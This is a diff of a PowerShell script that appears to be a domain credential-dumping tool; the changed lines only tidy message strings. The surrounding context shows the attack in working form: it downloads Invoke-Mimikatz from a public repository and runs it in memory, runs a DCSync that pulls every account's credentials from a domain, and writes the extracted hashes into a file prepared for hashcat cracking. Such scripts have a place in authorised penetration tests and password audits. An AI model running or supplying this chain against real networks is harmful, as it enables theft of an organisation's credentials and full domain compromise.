@@ -10,9 +10,9 @@ $Domain = $env:USERDNSDOMAIN
 Write-Host "[-] Downloading Mimikatz into Memory" -ForegroundColor Cyan
 IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-Write-Host "[-] DCSync will be executed again the Domain: $domain" -ForegroundColor Cyan
+Write-Host "[-] DCSync will be executed again the Domain: $Domain" -ForegroundColor Cyan
 
-    Write-Host "[!] Executing Mimikatz." -ForegroundColor Yellow
+    Write-Host "[!] Executing Mimikatz" -ForegroundColor Yellow
     $Command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
     Invoke-Mimikatz -Command $Command | Out-Null
     (Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
@@ -34,7 +34,7 @@ Write-Host "[-] DCSync will be executed again the Domain: $domain" -ForegroundCo
 
     $Lines = Get-Content -Path $HASHCATFILE
     $lineCount = ($Lines | Measure-Object -Line).Lines
-    Write-Host "[+] A total of [$lineCount] hashes have been extracted." -ForegroundColor Green
+    Write-Host "[+] A total of [$lineCount] hashes have been extracted" -ForegroundColor Green
     Write-Host ""
 
 $file_content = Get-Content -Path $HASHCATFILE
